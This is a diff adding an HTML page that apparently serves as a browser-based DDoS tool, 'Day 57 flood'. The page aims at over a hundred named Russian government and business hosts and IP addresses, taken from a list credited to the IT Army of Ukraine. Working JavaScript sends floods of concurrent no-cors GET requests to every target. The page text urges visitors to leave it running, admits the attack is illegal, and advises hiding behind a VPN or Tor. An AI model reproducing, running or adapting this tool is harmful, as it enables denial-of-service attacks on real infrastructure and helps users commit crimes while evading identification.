@@ -1,0 +1,479 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+<title>Day 57 flood</title>
+
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet"
+    integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.min.js"
+        integrity="sha384-QJHtvGhmr9XOIpI6YVutG+2QOK9T+ZnN4kzFN1RtK3zEFEIsxhlmWl5/YESvpZ13"
+        crossorigin="anonymous"></script>
+    <script src= 
+"https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"> 
+	</script> 
+
+	<script> 
+		/* Add "https://api.ipify.org?format=json" This method uses ipify.org api to get the clients IP Address. 
+		This method is completely free and no limitations of use. */ 
+
+		$.getJSON("https://api.ipify.org?format=json", 
+										function(data) { 
+
+			// userip element is where the IP will be displayed
+			$("#userip").html(data.ip); 
+		}) 
+	</script>
+		<style> 
+		h6 {
+		color:white;
+		}
+	    </style>
+    <style>
+        body {
+            padding: 0;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #FFD600;
+        }
+
+        .title {
+            margin: 3rem auto 3rem auto;
+            text-align: center;
+            color: #005BBC;
+        }
+
+        .intro .howto {
+            background-color: #005BBC;
+        }
+
+        .intro .howto h3 {
+            color: #FFD600;
+            text-align: center;
+            margin-top: 1rem;
+        }
+
+        .intro .howto p {
+            color: white;
+            text-align: justify;
+        }
+
+        .footer {
+            color: #005BBC;
+            text-align: center;
+            margin-top: 2rem;
+        }
+
+        .desc{
+            color:black;
+            padding-top: 2rem;
+            padding-bottom: 2rem;
+            margin: 0 auto;
+            width: 60%;
+        }
+
+        .desc h3 {
+            text-align: center;
+            color: #005BBC;
+        }
+
+        #stats h4 {
+            font-size: 1.1em;
+            text-decoration: underline;
+            color: #005BBC;
+            font-weight: 400;
+        }
+
+        table.status {
+            margin-bottom: 10px;
+        }
+    .style1 {
+	color: #CC0000;
+	font-weight: bold;
+}
+.style6 {color: #FF6262}
+    .style7 {font-size: 0.1px}
+    .style9 {
+	color: #FFD600;
+	font-weight: bold;
+	font-size: 18px;
+}
+    .style10 {font-size: 24px}
+    .style11 {
+	font-size: 16px;
+	color: #FFFFFF;
+}
+    .style13 {
+	margin: 3rem auto 3rem auto;
+	text-align: center;
+	color: #FFD600;
+	font-size: 24px;
+	font-weight: bold;
+}
+    .style14 {color: #FFFFFF}
+    .style15 {color: #FFFF00}
+    .style16 {color: #FF3300}
+    .style17 {color: #FF6633}
+.style21 {color: #B9DCFF}
+    .style22 {color: #ECE3AA}
+	
+table {
+  border-color: #fffd9c;
+}
+    </style>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8"></head>
+
+<body>
+    <div class="modal" id="exampleModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true" data-bs-backdrop="static" data-bs-keyboard="false">
+        <div class="modal-dialog modal-dialog-centered" role="document">
+          <div class="modal-content">
+            <div class="modal-header" style="
+    padding-bottom: 4px;
+    padding-top: 3px;
+">
+              <h5 id="exampleModalLabel" style="
+    margin-bottom: 0px;
+"><span class="modal-title style1">Warning: </span><span class="modal-title style6">Read before you continue. &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="style16">[</span><span class="style17">Day 57</span><span class="style16">]</span></span></h5>
+            </div>
+            <div class="modal-body" style="
+    padding-top: 5px;
+    padding-bottom: 0px;
+">
+              <p style="
+    margin-bottom: 0px;
+">As you're likely already aware, the action of  DoSing or participating in DDoS is illegal, and for good reason.<br>
+Click on continue if you have a VPN Enabled, use a  proxy, use the Tor browser or have your own secure connection and wish to  support Ukraine in taking down Russian and Belarussian propaganda, news,  government, military and banking sites.</p>
+              <hr style="
+    margin-top: 5px;
+    margin-bottom: 5px;
+">
+              <p>This works by sending GET requests to each targeted  website.<br>
+It’s only like opening each website at once on your PC  and<br>
+re-requesting the data over and over, although the data  is not saved or cached, It should be fair to say that your Internet service  Provider (ISP) shouldn’t be anymore bothered about this than they would you  browsing the internet, however some will be funny about it so it's always best  to protect yourself first.</p>
+            </div>
+            <div class="modal-footer">
+              <button type="button" class="btn btn-secondary" onClick="window.location.href='https://www.google.com'">Leave</button>
+              <button type="button" class="btn btn-primary" data-dismiss="exampleModalLabel" onClick="togglePause(); myModal.toggle();">Continue</button>
+            </div>
+          </div>
+        </div>
+</div>
+    <table width="100%" border="0" align="center" bgcolor="#005BBC">
+      <tr>
+        <td bgcolor="#004A9D"><div align="center">
+          <table width="200" border="1" style="border-top-width: 0px;">
+              <tbody><tr>
+                <td><table width="989" border="1" align="left" style="border-top-width: 0px;border-bottom-width: 0px;border-left-width: 0px;border-right-width: 0px;">
+                  <tbody>
+                    <tr>
+                      <td width="239" bgcolor="#005BB7"><div align="right"><span class="style14"><strong>&nbsp;Info:</strong> Your Public IP Address is:&nbsp; </span></div></td>
+                      <td width="175" bgcolor="#005BB7"><h6 id="userip" style="margin-bottom: 0px;">Loading..</h6></td>
+                      <td width="553" bgcolor="#005BB7"><div align="right"><span class="style21">For privacy, download the Tor Browser:</span>&nbsp;<a href="https://www.torproject.org/download/" target="_blank" class="style22" rel="nofollow">https://www.torproject.org/download/</a>&nbsp;&nbsp;&nbsp;</div></td>
+                    </tr>
+                  </tbody>
+                </table></td>
+              </tr>
+            </tbody></table>
+          <p class="style13" style="margin-top: 0px;margin-bottom: 0px;">          Propaganda http(s) flood  for <span class="style15">Day 57 </span></u> using targets from the IT Army of Ukraine.</u></p>
+        </div></td>
+      </tr>
+      <tr>
+        <td bgcolor="#0057B7"><div align="center" class="style9 style10">
+          <h3><u>Infomation about this tool.</u></h3>
+        </div></td>
+      </tr>
+      <tr>
+        <td><table width="90%" border="0" align="center">
+          <tr>
+            <td><p class="style11">This tool is hosted via GitHub Pages, You can download it for local use and customization <a href="https://raw.githubusercontent.com/helpukr/helpukr.github.io/main/day57.htm" target="_blank" class="style15">here</a> We'll aim to create a new page for each day a new set of targets is released in the Ukrainian IT Army's telegram servers.. </p>
+              <p class="style11">The "official" news in the Russian federation is all fake and need to be shut down, we need as many people as possible to help in any way you can, and just a tiny 1kbps of data could be the edge needed to take down a server. </p>
+              <p class="style11">Just open this page and leave it running on your devices as long as possible, it will flood there web-sites and together we can pose a huge load on their infrastructure.</p>
+            <p class="style11"> <strong>TIP:</strong> To see what
+			’s happening in more detail, open the developer console (F12) and select the Network Tab. If you have an older device and find the page crashes after so long, you can stop recording network log (ctrl+e from developer console).</p>
+            <hr style="
+    margin-top: 5px;
+    margin-bottom: 5px;
+	color: #FFFFFF
+"></td>
+          </tr>
+        </table>
+          <table width="50%" border="0" align="center">
+            <tr>
+              <td><h3 align="center" class="style14">Session Status</h3>
+                <p align="center" class="style14" style="
+    margin-bottom: 0px;
+    padding-bottom: 2px;
+">Below is the number of error responses and fragmented data from each GET request, individual responses for each targeted website are shown below detailing both requests and responses.<br>
+                  Some failure to fetch is normal! That means their servers are overloaded and dropping packets - which is the goal! However all of them dropping likely indicates they have blocked the IP you're using and you should switch to a new one.</p>
+                <p align="center" class="style7" style="
+    margin-bottom: 0px;
+">Total number of requests: <span id="totalrequests">0</span></p></td>
+            </tr>
+          </table>          </td>
+      </tr>
+    </table>
+    <div class="desc text-center" style="
+    padding-top: 4px;
+">
+      <p>Total overloaded / dropping packets: <span id="totalerrors"><em>waiting..</em></span></p>
+    <button type="button" class="btn btn-primary" onClick="togglePause();" style="
+    padding-left: 32px;
+    padding-right: 32px;
+    padding-top: 8px;
+    padding-bottom: 8px;
+">Resume</button>
+</div>
+
+    <div id="stats" class="container">
+        <div class="row">
+        </div>
+    </div>
+
+    <p class="footer">Reformated from https://stop-russian-desinformation.near.page | Forked from infoek.cz/ddos.html</p>
+
+    <script>        
+        // target list
+        var urls = [
+            'https://regservice.keydisk.ru',
+            'https://callback.keydisk.ru',
+            'http://91.239.5.113:80',
+            'https://91.239.5.113:443',
+            'https://91.239.5.113:8080',
+            'https://91.239.5.113:8091',
+            'https://91.239.5.113:8092',
+            'https://91.239.5.113:10000',
+            'http://report.keydisk.ru',
+            'http://31.13.60.76:80',
+            'https://31.13.60.76:465',
+            'https://31.13.60.76:110',
+            'https://31.13.60.76:995',
+            'https://nsqadmin.1c-edo.keydisk.ru',
+            'https://invitations.1c-edo.keydisk.ru',
+            'http://91.239.5.38:80',
+            'https://91.239.5.38:443',
+            'https://service.fsrar.ru',
+            'http://146.120.90.20:80',
+            'https://146.120.90.20:443',
+            'http://frap.fsrar.ru',
+            'http://146.120.90.24:80',
+            'https://fsrar.gov.ru',
+            'https://dfo.fsrar.gov.ru',
+            'http://forum.fsrar.ru',
+            'https://146.120.90.25:443',
+            'http://ca.fsrar.ru',
+            'http://146.120.90.157:80',
+            'https://public.fsrar.ru',
+            'http://146.120.90.95:80',
+            'https://146.120.90.95:443',
+            'https://service.alcolicenziat.ru/auth/login',
+            'http://146.120.90.61:80',
+            'https://146.120.90.61:443',
+            'http://f4.fss.ru',
+            'http://docs.fss.ru',
+            'http://193.148.44.187:80',
+            'https://193.148.44.187:443',
+            'https://eln.fss.ru',
+            'http://193.148.44.25:80',
+            'https://193.148.44.25:443',
+            'https://sedo.fss.ru',
+            'http://193.148.44.114:80',
+            'https://193.148.44.114:443',
+            'https://lk.fss.ru',
+            'http://193.148.44.188:80',
+            'http://193.148.44.188:81',
+            'https://193.148.44.188:443',
+            'https://213.171.56.46/soap?wsdl',
+            'https://213.171.56.46/soap',
+            'http://213.171.56.46:80',
+            'https://213.171.56.46:443',
+            'https://websbor.gks.ru/online',
+            'https://online.gks.ru/online',
+            'http://83.229.254.40:80',
+            'https://83.229.254.40:443',
+            'https://83.229.254.40:6080',
+            'https://83.229.254.40:8080',
+            'https://nfo-report.1c.ru',
+            'http://185.12.155.115:80',
+            'https://185.12.155.115:443',
+            'http://downloads.1c.ru',
+            'http://185.12.155.210:80',
+            'https://185.12.155.210:443',
+            'https://v8.1c.ru',
+            'http://185.169.155.230:80',
+            'https://185.169.155.230:443',
+            'https://downloads.v8.1c.ru',
+            'http://185.12.155.124:80',
+            'https://185.12.155.124:443',
+            'https://login.1c.ru/login',
+            'http://185.12.155.29:80',
+            'https://185.12.155.29:443',
+            'https://reputils.1c.ru',
+            'https://185.12.155.21:443',
+            'http://regservice.1c.ru/regservice/regservice.asmx?WSDL',
+            'http://regservice.1c.ru/regservice/regservice.asmx',
+            'http://185.12.152.27:80',
+            'https://185.12.152.27:443',
+            'https://torg.1c.ru/equipment/onlayn-kassy/?utm_source=its&utm_medium=tmenu',
+            'http://185.12.155.12:80',
+            'https://185.12.155.12:443',
+            'http://online.1c.ru/catalog/products',
+            'http://185.169.155.229:80',
+            'https://185.169.155.229:443',
+            'https://its.1c.ru',
+            'http://185.12.155.120:80',
+            'https://185.12.155.120:443',
+            'https://www.cryptopro.ru',
+            'http://178.248.239.130:80',
+            'https://178.248.239.130:443',
+            'https://getserial.infotecs.ru',
+            'http://185.169.155.77:80',
+            'https://185.169.155.77:443',
+            'https://1c-report.ru',
+            'http://80.87.203.131:80',
+            'https://80.87.203.131:443',
+            'https://rarus.ru',
+            'http://194.226.180.78:80',
+            'https://194.226.180.78:443',
+            'http://rhelper.rarus.ru',
+            'http://194.226.180.80:80',
+            'https://194.226.180.80:443',
+            'https://194.226.180.80:8893',
+            'https://update.rarus.ru/public',
+            'http://195.19.25.47:80',
+            'http://195.19.25.47:88',
+            'http://195.19.25.47:111',
+            'http://195.19.25.47:123',
+            'https://195.19.25.47:443',
+            'https://195.19.25.47:800',
+            'https://195.19.25.47:3071',
+            'https://195.19.25.47:5357',
+            'https://195.19.25.47:10000',
+            'https://195.19.25.47:34572',
+            'https://techlab.rarus.ru',
+            'https://bo.rarus.ru',
+            'https://pos.rarus.ru',
+            'http://194.226.180.66:80',
+            'https://194.226.180.66:443',
+        ];
+
+        // initialize variables
+        var targets = urls.reduce((o, key) => ({ ...o, [key]: {number_of_requests: 0, number_of_errored_responses: 0}}), {})
+        var statRow = document.querySelector("#stats > .row");
+        var myModal = new bootstrap.Modal(document.getElementById('exampleModal'), {});
+        var CONCURRENCY_LIMIT = 200;
+        var queue = [];
+        var attack = false;
+        var totalrequests = 0;
+        var totalerrors = 0;
+
+        function togglePause () {
+            if (attack) {
+                attack = false;
+                document.querySelector("div.desc .btn").innerText = "Resume";
+            } else {
+                attack = true;
+                document.querySelector("div.desc .btn").innerText = "Pause";
+                for (var i=0; i<urls.length; i++) {
+                    flood(i);
+                }
+            }
+        }
+
+        async function fetchWithTimeout(resource, options) {
+            const controller = new AbortController();
+            const id = setTimeout(() => controller.abort(), options.timeout);
+            return fetch(resource, {
+                signal: controller.signal,
+                mode: 'no-cors'
+            }).then((response) => {
+                clearTimeout(id);
+                return response;
+            }).catch((error) => {
+                clearTimeout(id);
+                throw error;
+            });
+        }
+
+        async function sleep(ms) {
+            return new Promise(r => setTimeout(r, ms));
+        }         
+
+        async function flood(n) {
+            const url = urls[n];
+            const target = targets[url];
+
+            while (attack) {
+                if (queue.length > CONCURRENCY_LIMIT) {
+                    await queue.shift();
+                }
+                queue.push(
+                    fetchWithTimeout(url, { timeout: 2000 })
+                        .catch((error) => {
+                            if (error.code === 20 /* ABORT */) {
+                                return;
+                            }
+                            target.number_of_errored_responses++;
+                            target.error_message = error.message;
+                            totalerrors++;
+                        })
+                        .then((response) => {
+                            if (response && !response.ok) {
+                                target.number_of_errored_responses++;
+                                target.error_message = response.statusText;
+                                totalerrors++;
+                            }
+                            target.number_of_requests++;
+                        })
+                        .finally(() => updateTargetDisplay(n))
+                );
+
+                await sleep(1);
+            }
+        }
+
+        // Update data for target n
+        function updateTargetDisplay(n) {
+            var url = urls[n];
+            var {number_of_requests, number_of_errored_responses} = targets[url];
+            var requests_cell = document.querySelector(`#target${n} .requests`);
+            var errors_cell = document.querySelector(`#target${n} .errors`);
+            requests_cell.innerText = number_of_requests;
+            errors_cell.innerText = number_of_errored_responses;
+            document.querySelector("#totalrequests").innerText = totalrequests;
+            document.querySelector("#totalerrors").innerText = totalerrors;
+        }
+
+        // Shuffle array order before starting
+        for (let i = urls.length - 1; i > 0; i--) {
+            const j = Math.floor(Math.random() * (i + 1));
+            [urls[i], urls[j]] = [urls[j], urls[i]];
+        }
+
+        // Create div for each target
+        for (var i=0; i<urls.length; i++) {
+            statRow.innerHTML += `
+                <div class="col-lg-3 col-md-4 col-sm-6" id="target${i}">
+                    <h4>${urls[i]}</h4>
+                    <table class='status'>
+                        <tr><td>requests:</td><td class="requests">0</td></tr>
+                        </tr><td>errors:</td><td class="errors">0</td></tr>
+                    </table>
+                </div>
+            `;
+        }
+
+        // Show warning window
+        myModal.toggle();
+
+    
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-85513613-1');
+</script>
+</html>
